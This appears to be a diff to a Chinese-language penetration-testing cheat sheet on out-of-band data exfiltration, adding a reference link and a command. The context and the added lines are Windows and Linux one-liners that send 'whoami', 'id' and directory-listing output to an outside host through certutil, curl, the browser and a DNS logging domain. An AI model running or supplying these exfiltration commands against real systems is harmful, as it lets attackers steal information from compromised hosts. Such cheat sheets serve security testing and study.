@@ -224,6 +224,8 @@ xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.por
 `for /F %x in ('whoami') do start https://www.dark5.net/%x` #启动浏览器访问
 `for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #内置命令行工具访问
 
+`for /F %x in ('dir /b') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #只列出文件名
+
 ## Linux
 `for /F "delims=\" %i in ('whoami') do curl http://www.dark5.net/%i`
 
@@ -250,3 +252,5 @@ curl http://xxx.dnslog.link/`id|base64`
 [Oracle注入之带外通信](https://www.cnblogs.com/-qing-/p/10952341.html)
 
 [带外通道技术（OOB）总结](https://www.freebuf.com/articles/web/201013.html)
+
+[DNSLOG使用技巧](http://www.tiaozhanziwo.com/archives/851.html)
